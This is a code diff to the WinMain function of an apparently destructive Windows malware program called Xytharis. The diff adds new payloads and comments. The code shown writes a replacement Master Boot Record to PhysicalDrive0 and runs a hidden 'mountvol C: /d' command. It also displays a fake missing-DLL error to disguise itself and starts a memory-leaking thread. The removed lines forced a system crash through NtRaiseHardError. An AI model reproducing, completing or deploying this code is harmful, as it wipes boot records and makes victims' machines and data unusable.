@@ -99,7 +99,9 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         p33,
         p34,
         p35,
-        p36
+        p36,
+        p40,
+        p41
     }; // use: payloads[x]() for function px(). why use this? functions in random order, im still working on porting all payloads to payloads.h
     
     HDC desk = GetDC(NULL);
@@ -125,6 +127,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     msglol.hwndOwner = NULL;
     msglol.hInstance = GetModuleHandle(NULL);
     msglol.lpszText = "Cannot find vcruntime140.dll. Click OK to terminate the program. This error has been reported.";
+    // When get a "cannot find DLL" but also get the "had been reported", then it's a malware
+    // Why? because it haven't have connection to kernel, even the internet.
     msglol.lpszCaption = "Fatal error in Xytharis.exe";
     msglol.dwStyle = MB_OK | MB_ICONHAND;
     HANDLE hmsg1 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msglol, NULL, NULL);
@@ -135,15 +139,16 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     HANDLE hAudio = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)audio, NULL, 0, NULL);
 
     HANDLE hLeakRAM = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[0], NULL, 0, NULL);
-
+    p41(); // must call before
     DWORD dwBytesWritten;
     HANDLE hDevice = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
     WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
     CloseHandle(hDevice);
 
     ShellExecuteA(NULL, "open" "C:\\Windows\\System32\\cmd.exe", "mountvol C: /d", NULL, NULL, SW_HIDE);
-    ShellExecuteA(NULL, "open" "C:\\Windows\\sysnative\\cmd.exe", "mountvol C: /d", NULL, NULL, SW_HIDE);
-
+    // Won't work
+    // ShellExecuteA(NULL, "open" "C:\\Windows\\sysnative\\cmd.exe", "mountvol C: /d", NULL, NULL, SW_HIDE);
+    //                                                ^ problem
     Sleep(5000);
 
     MSGBOXPARAMS msg2 = { 0 };
@@ -258,13 +263,9 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         Sleep(rand() % 5000);
     }
 
-    //crash
-    BOOLEAN bOld2;
-    ULONG ulResponse;
-    RtlAdjustPrivilege(19, TRUE, FALSE, &bOld2);
-    NtRaiseHardError(0xDEADDEAD, NULL, NULL, NULL, 6, &ulResponse);
-    FreeLibrary(ntdll);
 
+    // When crashed, it's the end of handles, it will save dump files to disk, when MBR are corrupted, it's done.
+    end();
     ReleaseDC(NULL, desk);
     ReleaseDC(NULL, hHDC);
     CloseHandle(hmsg1);
